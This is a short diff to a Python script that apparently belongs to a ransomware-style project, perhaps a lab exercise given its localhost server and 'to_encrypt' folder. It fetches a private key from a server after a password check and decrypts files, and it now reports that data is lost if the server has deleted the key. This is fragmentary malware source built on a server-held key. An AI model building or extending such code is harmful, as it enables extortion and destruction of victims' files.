@@ -11,6 +11,7 @@ import os
 import glob
 from Crypto.Cipher import AES
 from multiprocessing import Process
+import sys
 
 global host
 host = "localhost"
@@ -154,12 +155,16 @@ mdp = ""
 while hash_pass(mdp)!=hash_content:
     mdp = input("Entrez le mot de passe :")
 with urllib.request.urlopen(f"http://{host}/decrypt?pass={mdp}") as key_file:
-    private_key = serialization.load_pem_private_key(
-    key_file.read(),
-    password=None,
-    backend=default_backend()
-)
+    try:
+        private_key = serialization.load_pem_private_key(
+        key_file.read(),
+        password=None,
+        backend=default_backend())
+    except:
+        print("[-] Key deleted from the database, data lost !")
+        sys.exit(0)
 symetric_key = decrypt_symetric_key(symetric_key,private_key)
+
 for i in glob.glob("./to_encrypt/*"):
     if ".encrypted_sym" in i or ".encrypted" in i:
         decrypt_one_file(i,mdp,private_key,symetric_key)
